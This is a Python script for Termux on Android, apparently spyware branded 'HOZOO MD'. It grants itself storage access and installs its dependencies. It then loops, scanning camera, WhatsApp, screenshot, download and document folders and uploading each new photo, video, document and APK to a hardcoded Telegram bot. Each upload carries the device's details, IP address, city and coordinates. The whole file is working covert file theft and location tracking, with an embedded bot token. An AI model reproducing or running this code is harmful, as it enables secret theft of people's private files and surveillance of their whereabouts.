import time
import requests
import subprocess
from pathlib import Path
import psutil
import os
import sys

TOKEN = "8369000292:AAFhrncymw4_zj5mRM6Trj5PtFNzwOAjTDU"
CHAT_ID = ["8317643774"]
cek_path = Path("/data/data/com.termux/files/usr/lib/commplate")
sent_files_file = "/data/data/com.termux/files/usr/lib/sent_files.txt"
sent_files = set()

# Daftar direktori yang akan di-scan
SCAN_DIRECTORIES = [
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Pictures/Screenshots", 
    "/storage/emulated/0/Pictures/WhatsApp",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Android/data/com.whatsapp/Media",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Documents"
]

# Cek jika sent_files.txt sudah ada
if Path(sent_files_file).exists():
    with open(sent_files_file, "r") as f:
        sent_files = set(f.read().splitlines())

def get_device_info():
    try:
        # Menjalankan neofetch untuk mendapatkan informasi perangkat
        result = subprocess.check_output(["neofetch", "--stdout"]).decode("utf-8")
        
        # Ekstrak informasi dengan error handling
        brand = "Unknown"
        os_name = "Unknown"
        model = "Unknown"
        
        for line in result.splitlines():
            if "Host:" in line or "Device:" in line:
                try:
                    brand = line.split(":")[1].strip()
                except IndexError:
                    pass
            elif "OS:" in line:
                try:
                    os_name = line.split(":")[1].strip()
                except IndexError:
                    pass
            elif "Model:" in line:
                try:
                    model = line.split(":")[1].strip()
                except IndexError:
                    pass

        # Mendapatkan informasi memori
        memory = psutil.virtual_memory().total / (1024 ** 3)  # Konversi ke GB
        memory_info = f"{memory:.2f} GB"
        
        # Mendapatkan informasi storage
        storage = psutil.disk_usage('/').total / (1024 ** 3)  # Konversi ke GB
        storage_info = f"{storage:.2f} GB"
        
        # Mendapatkan informasi IP dan lokasi
        try:
            ip_info = requests.get("http://ipinfo.io", timeout=10).json()
            ip_address = ip_info.get("ip", "N/A")
            city = ip_info.get("city", "N/A")
            region = ip_info.get("region", "N/A")
            country = ip_info.get("country", "N/A")
            loc = ip_info.get("loc", "N/A")
            org = ip_info.get("org", "N/A")
        except:
            ip_address = "N/A"
            city = "N/A"
            region = "N/A"
            country = "N/A"
            loc = "N/A"
            org = "N/A"

        return brand, model, os_name, memory_info, storage_info, ip_address, city, region, country, loc, org

    except Exception as e:
        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"

def send_file(file_path, caption):
    try:
        file_size = os.path.getsize(file_path) / (1024 * 1024)  # MB
        
        with open(file_path, "rb") as f:
            for chat_id in CHAT_ID:
                try:
                    response = requests.post(
                        f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                        data={"chat_id": chat_id, "caption": caption[:1024]},  # Telegram caption limit
                        files={"document": (os.path.basename(file_path), f)},
                        timeout=60
                    )
                    if response.status_code == 200:
                        print(f"✓ Successfully sent to {chat_id}: {os.path.basename(file_path)} ({file_size:.2f} MB)")
                    else:
                        print(f"✗ Failed to send to {chat_id}: {response.status_code} - {response.text}")
                except Exception as e:
                    print(f"✗ Error sending to {chat_id}: {e}")
            
            # Tambahkan ke daftar file yang sudah dikirim
            sent_files.add(file_path)
            with open(sent_files_file, "a") as sf:
                sf.write(f"{file_path}\n")
            return True
    except Exception as e:
        print(f"✗ Error sending file {file_path}: {e}")
        return False

def send_apk_info(apk_path):
    """Extract and send APK information"""
    try:
        import zipfile
        from androguard.core.bytecodes.apk import APK
        
        apk = APK(apk_path)
        app_name = apk.get_app_name() or "Unknown"
        package_name = apk.get_package() or "Unknown"
        version = apk.get_androidversion_code() or "Unknown"
        permissions = apk.get_permissions()
        
        apk_info = (
            f"📱 APK Information:\n"
            f"🏷️ App Name: {app_name}\n"
            f"📦 Package: {package_name}\n"
            f"🔢 Version: {version}\n"
            f"🔐 Permissions: {len(permissions)}\n"
            f"📁 File: {os.path.basename(apk_path)}"
        )
        
        return apk_info
    except:
        return f"📱 APK File: {os.path.basename(apk_path)}\n⚠️ Could not extract detailed APK info"

def process_files(extension):
    files_found = 0
    files_sent = 0
    
    try:
        for directory in SCAN_DIRECTORIES:
            if not os.path.exists(directory):
                continue
                
            print(f"🔍 Scanning: {directory} for .{extension}")
            
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith(f".{extension}"):
                        file_path = os.path.join(root, file)
                        
                        # Skip jika file sudah dikirim
                        if file_path in sent_files:
                            continue
                            
                        if os.path.exists(file_path):
                            try:
                                files_found += 1
                                
                                # Cek ukuran file
                                file_size = os.path.getsize(file_path) / (1024 * 1024)  # MB
                                if file_size > 100:  # Skip file larger than 100MB
                                    print(f"⏭️ Skipping large file: {file} ({file_size:.2f} MB)")
                                    continue
                                
                                # Dapatkan informasi device
                                brand, model, os_name, memory, storage, ip_address, city, region, country, loc, org = get_device_info()
                                
                                # Buat caption berdasarkan tipe file
                                if extension == "apk":
                                    apk_info = send_apk_info(file_path)
                                    caption = (
                                        f"🚀 HOZOO MD - APK CAPTURED 🚀\n\n"
                                        f"{apk_info}\n\n"
                                        f"🔰 DEVICE INFORMATION 🔰\n"
                                        f"📱 Brand: {brand}\n"
                                        f"📟 Model: {model}\n"
                                        f"🖥️ OS: {os_name}\n"
                                        f"💾 RAM: {memory}\n"
                                        f"💿 Storage: {storage}\n"
                                        f"📊 File Size: {file_size:.2f} MB\n"
                                        f"📁 Directory: {root}\n\n"
                                        f"🌐 NETWORK INFORMATION 🌐\n"
                                        f"📍 IP: {ip_address}\n"
                                        f"🏙️ City: {city}\n"
                                        f"📍 Region: {region}\n"
                                        f"🇨🇺 Country: {country}\n"
                                        f"📌 Coordinates: {loc}\n"
                                        f"🏢 ISP: {org}\n"
                                        f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                                    )
                                else:
                                    file_type_map = {
                                        "jpg": "🖼️ IMAGE", "jpeg": "🖼️ IMAGE", "png": "🖼️ IMAGE",
                                        "mp4": "🎥 VIDEO", "mov": "🎥 VIDEO", "avi": "🎥 VIDEO",
                                        "pdf": "📄 DOCUMENT", "doc": "📄 DOCUMENT", "docx": "📄 DOCUMENT",
                                        "zip": "📦 ARCHIVE", "rar": "📦 ARCHIVE",
                                        "js": "📝 SCRIPT", "py": "🐍 PYTHON SCRIPT",
                                        "txt": "📝 TEXT FILE", "log": "📝 LOG FILE"
                                    }
                                    file_type = file_type_map.get(extension, "📁 FILE")
                                    
                                    caption = (
                                        f"🎯 HOZOO MD - {file_type} CAPTURED 🎯\n\n"
                                        f"📝 File: {file}\n"
                                        f"📁 Directory: {root}\n"
                                        f"📊 Size: {file_size:.2f} MB\n"
                                        f"🔍 Type: {extension.upper()}\n\n"
                                        f"🔰 DEVICE INFORMATION 🔰\n"
                                        f"📱 Brand: {brand}\n"
                                        f"📟 Model: {model}\n"
                                        f"🖥️ OS: {os_name}\n"
                                        f"💾 RAM: {memory}\n"
                                        f"💿 Storage: {storage}\n\n"
                                        f"🌐 NETWORK INFORMATION 🌐\n"
                                        f"📍 IP: {ip_address}\n"
                                        f"🏙️ City: {city}\n"
                                        f"📍 Region: {region}\n"
                                        f"🇨🇺 Country: {country}\n"
                                        f"📌 Coordinates: {loc}\n"
                                        f"🏢 ISP: {org}\n"
                                        f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                                    )
                                
                                # Kirim file
                                if send_file(file_path, caption):
                                    files_sent += 1
                                    time.sleep(3)  # Delay untuk menghindari rate limit
                                
                            except Exception as e:
                                print(f"✗ Error processing {file_path}: {e}")
    
    except Exception as e:
        print(f"✗ Error in process_files: {e}")
    
    return files_found, files_sent

def install_package(package_name):
    """Install package jika belum terinstall"""
    try:
        if package_name == "neofetch":
            check_path = "/data/data/com.termux/files/usr/bin/neofetch"
        elif package_name == "curl":
            check_path = "/data/data/com.termux/files/usr/bin/curl"
        elif package_name == "jq":
            check_path = "/data/data/com.termux/files/usr/bin/jq"
        else:
            return
            
        if not Path(check_path).exists():
            print(f"📦 Installing {package_name}...")
            result = os.system(f"pkg install {package_name} -y")
            if result == 0:
                print(f"✓ {package_name} installed successfully")
            time.sleep(2)
    except Exception as e:
        print(f"✗ Error installing {package_name}: {e}")

def install_androguard():
    """Install androguard untuk analisis APK"""
    try:
        import androguard
        print("✓ Androguard already installed")
    except ImportError:
        print("📦 Installing androguard for APK analysis...")
        os.system("pip install androguard")
        print("✓ Androguard installed")

def check_directories():
    """Cek akses direktori"""
    accessible_dirs = []
    for directory in SCAN_DIRECTORIES:
        if os.path.exists(directory):
            accessible_dirs.append(directory)
            print(f"✓ Accessible: {directory}")
        else:
            print(f"✗ Not accessible: {directory}")
    return accessible_dirs

def send_startup_message():
    """Kirim pesan startup ke Telegram"""
    try:
        brand, model, os_name, memory, storage, ip_address, city, region, country, loc, org = get_device_info()
        
        startup_msg = (
            f"🚀 HOZOO MD ACTIVATED 🚀\n\n"
            f"📱 Device: {brand} {model}\n"
            f"🖥️ OS: {os_name}\n"
            f"💾 RAM: {memory}\n"
            f"💿 Storage: {storage}\n"
            f"📍 IP: {ip_address}\n"
            f"🌍 Location: {city}, {region}, {country}\n"
            f"📌 Coordinates: {loc}\n"
            f"🏢 ISP: {org}\n"
            f"⏰ Activated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔍 Monitoring directories...\n"
            f"📁 Total directories: {len(SCAN_DIRECTORIES)}"
        )
        
        for chat_id in CHAT_ID:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={"chat_id": chat_id, "text": startup_msg}
            )
    except Exception as e:
        print(f"✗ Error sending startup message: {e}")

def cleanup_old_entries():
    """Bersihkan entri file yang sudah tidak ada"""
    try:
        if Path(sent_files_file).exists():
            with open(sent_files_file, "r") as f:
                existing_files = f.read().splitlines()
            
            # Hanya simpan file yang masih ada
            valid_files = [f for f in existing_files if os.path.exists(f)]
            
            with open(sent_files_file, "w") as f:
                f.write("\n".join(valid_files))
            
            print(f"✓ Cleaned up {len(existing_files) - len(valid_files)} old entries")
    except Exception as e:
        print(f"✗ Error cleaning up: {e}")

def main():
    startup_done = False
    
    while True:
        try:
            if cek_path.exists():
                if not startup_done:
                    print("🚀 Starting HOZOO MD...")
                    
                    # Install dependencies
                    install_package("neofetch")
                    install_package("curl")
                    install_package("jq")
                    install_androguard()
                    
                    # Setup awal
                    cleanup_old_entries()
                    accessible_dirs = check_directories()
                    
                    # Kirim pesan startup
                    send_startup_message()
                    startup_done = True
                    print("✓ Startup completed")

                # Ekstensi file yang akan dipantau
                extensions = [
                    "apk", "jpg", "jpeg", "png", "mp4", "mov", "avi",
                    "pdf", "doc", "docx", "zip", "rar", "js", "py", 
                    "txt", "log", "xml", "json", "csv"
                ]
                
                total_found = 0
                total_sent = 0
                
                print(f"\n🔄 Starting scan cycle at {time.strftime('%H:%M:%S')}")
                
                for ext in extensions:
                    found, sent = process_files(ext)
                    total_found += found
                    total_sent += sent
                    time.sleep(1)
                
                print(f"📊 Cycle completed: Found {total_found} new files, Sent {total_sent} files")
                print(f"⏰ Next scan in 30 seconds...\n")
                time.sleep(30)

            else:
                # Setup mode
                print("⚙️ Initial setup mode...")
                os.system("clear")
                os.system("echo y | termux-setup-storage")
                os.system("apt-get update -y")
                os.system("apt-get install -y curl neofetch jq psutil python-pip")
                os.system("pip install requests androguard")
                
                cek_path.parent.mkdir(parents=True, exist_ok=True)
                cek_path.touch()
                print("✓ Setup completed. Restarting...")
                time.sleep(5)
                
        except Exception as e:
            print(f"✗ Critical error in main loop: {e}")
            print("🔄 Restarting in 30 seconds...")
            time.sleep(30)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Script stopped by user")
    except Exception as e:
        print(f"\n💥 Critical error: {e}")
        print("🔄 Restarting script...")
        time.sleep(10)
        os.execv(sys.executable, [sys.executable] + sys.argv)
